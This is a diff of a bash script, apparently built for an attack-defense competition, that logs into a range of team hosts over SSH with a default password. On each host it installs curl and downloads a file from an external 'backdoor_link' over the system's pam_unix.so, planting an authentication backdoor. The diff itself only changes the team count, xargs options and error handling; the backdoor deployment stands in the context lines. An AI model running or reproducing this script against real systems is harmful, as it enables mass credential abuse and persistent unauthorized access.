@@ -9,7 +9,7 @@ backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q
 
 create_IPs() {
     network_id="1.1"
-    number_of_teams=10
+    number_of_teams=3
     host_ids=(1 2 3)
     for ((team=1; team<=number_of_teams; team++)); do
         for host_id in "${host_ids[@]}"; do
@@ -22,7 +22,7 @@ main() {
     create_IPs
     export default_password timeout_duration username path_to_pam backdoor_link
 
-    printf "%s\n" "${IPs[@]}" | xargs -P 20 -I {} bash -c '
+    printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
         IP="{}"
         sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$username@$IP" "
             echo \"$default_password\" | sudo -S apt install -y curl || \
@@ -30,7 +30,7 @@ main() {
             echo \"$default_password\" | sudo -S zypper install -y curl || \
             echo \"$default_password\" | sudo -S pacman -Syu curl --noconfirm
             echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
-        "
+        " || true
     '
 }
 
